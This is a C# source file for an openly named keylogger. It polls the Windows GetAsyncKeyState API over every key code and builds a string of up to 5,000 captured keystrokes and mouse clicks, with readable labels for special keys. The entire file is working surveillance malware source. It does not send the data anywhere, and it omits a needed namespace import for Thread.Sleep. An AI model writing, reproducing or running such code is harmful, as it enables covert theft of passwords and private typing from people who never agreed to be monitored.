using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static System.Runtime.CompilerServices.RuntimeHelpers;

namespace KeyLogger
{
    static class Logger
    {
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int key);

        public static string Log()
        {
            string log = "";

            while (log.Length < 5000)
            {
                for (int i = 1; i < 255; i++)
                {
                    int result = GetAsyncKeyState(i);

                    if (result != 0)
                    {
                        log = log + checkExceptions(i);
                        Thread.Sleep(115);
                    }
                }
            }

            return log;
        }

        public static string checkExceptions(int i)
        {
            switch (i)
            {
                case 1: return "<Left Click>";
                case 2: return "<Right Click>";
                case 4: return "<Middle Click>";
                case 5: return "<X1 Mouse Button>";
                case 6: return "<X2 Mouse Button>";
                case 8: return "<Backspace>";
                case 9: return "<Tab>";
                case 13: return "<Enter>";
                case 16: return "<Shift>";
                case 17: return "<Control>";
                case 18: return "<Alt>";
                case 20: return "<Caps Lock>";
                case 27: return "<Escape>";
                case 32: return "<Space>";
                case 33: return "<Page Up>";
                case 34: return "<Page Down>";
                case 35: return "<End>";
                case 36: return "<Home>";
                case 37: return "<Left Arrow>";
                case 38: return "<Up Arrow>";
                case 39: return "<Right Arrow>";
                case 40: return "<Down Arrow>";
                case 46: return "<Delete>";
                case 112: return "<F1>";
                case 113: return "<F2>";
                case 114: return "<F3>";
                case 115: return "<F4>";
                case 116: return "<F5>";
                case 117: return "<F6>";
                case 118: return "<F7>";
                case 119: return "<F8>";
                case 120: return "<F9>";
                case 121: return "<F10>";
                case 122: return "<F11>";
                case 123: return "<F12>";
                case 160: return "<Left Shift>";
                case 161: return "<Right Shift>";
                case 162: return "<Left Control>";
                case 163: return "<Right Control>";
                case 164: return "<Left Alt>";
                case 165: return "<Right Alt>";
                default: return ((char)i).ToString();
            }
        }
    }
}
